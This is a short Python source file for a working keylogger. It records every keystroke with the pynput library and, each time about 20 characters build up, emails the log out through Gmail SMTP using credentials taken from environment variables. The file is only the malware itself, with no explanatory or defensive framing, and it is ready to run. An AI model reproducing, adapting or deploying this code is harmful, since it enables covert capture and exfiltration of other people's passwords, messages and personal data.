from pynput.keyboard import Key, Listener
from environs import Env
import smtplib

env = Env()
env.read_env()

word = ''
full_log = ''
chars_limit = 20


def keylogger(key):
    global word
    global full_log
    global chars_limit

    if key == Key.space:
        word += ' '
        full_log += word
        word = ''
    elif key == Key.enter:
        word += '\n'
        full_log += word
        word = ''

    elif key == Key.backspace:
        word = word[:-1]
    elif key == Key.shift_l or key == Key.shift_r or key == Key.alt_l or key == Key.tab:
        return
    elif key == Key.esc:
        return False
    else:
        char = f"{key}"
        char = char[1:-1]
        word += char
        full_log += word
        word = ''

    if len(full_log) >= chars_limit:
        # print(full_log)
        # with open('logs.txt', 'w', encoding='utf-8') as f:
        #     f.write(full_log)
        send_email()
        print("[INFO] Sent logs!")
        full_log = ''


def send_email():
    sender = env.str("EMAIL")
    password = env.str("PASS")

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    server.login(sender, password)
    server.sendmail(sender, sender, full_log.encode('utf-8'))


def main():
    with Listener(on_press=keylogger) as log:
        log.join()


if __name__ == "__main__":
    main()
